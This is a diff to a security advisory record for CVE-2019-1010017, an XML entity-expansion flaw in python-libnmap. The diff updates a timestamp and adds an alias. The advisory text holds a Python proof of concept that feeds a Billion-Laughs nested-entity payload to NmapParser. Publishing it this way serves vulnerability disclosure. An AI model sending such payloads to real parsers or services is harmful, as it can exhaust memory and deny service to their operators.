@@ -1,9 +1,10 @@
 {
   "id": "GHSA-9ccv-p7fg-m73x",
-  "modified": "2023-10-22T05:31:39.126782Z",
+  "modified": "2023-11-08T04:00:40.541888Z",
   "published": "2019-07-18T15:38:41Z",
   "aliases": [
-    "CVE-2019-1010017"
+    "CVE-2019-1010017",
+    "PYSEC-2019-218"
   ],
   "summary": "XML Injection in python-libnmap",
   "details": "### Description\n\npython-libnmap is affected by a Billion-Laughs -style XML injection vulnerability.\n\n### PoC\n\n```python\nty = NmapParser()\n\npayload = \"\"\"\n\u003c!DOCTYPE lolz [\n \u003c!ENTITY lol \"lol\"\u003e\n \u003c!ELEMENT lolz (#PCDATA)\u003e\n \u003c!ENTITY lol1 \"\u0026lol;\u0026lol;\u0026lol;\u0026lol;\u0026lol;\u0026lol;\u0026lol;\u0026lol;\u0026lol;\u0026lol;\"\u003e\n \u003c!ENTITY lol2 \"\u0026lol1;\u0026lol1;\u0026lol1;\u0026lol1;\u0026lol1;\u0026lol1;\u0026lol1;\u0026lol1;\u0026lol1;\u0026lol1;\"\u003e\n \u003c!ENTITY lol3 \"\u0026lol2;\u0026lol2;\u0026lol2;\u0026lol2;\u0026lol2;\u0026lol2;\u0026lol2;\u0026lol2;\u0026lol2;\u0026lol2;\"\u003e\n]\u003e\n\u003clolz\u003e\u003chello\u003e\u0026lol3;\u003c/hello\u003e\u003c/lolz\u003e\n\"\"\"\n\nty.parse(payload)\n```",
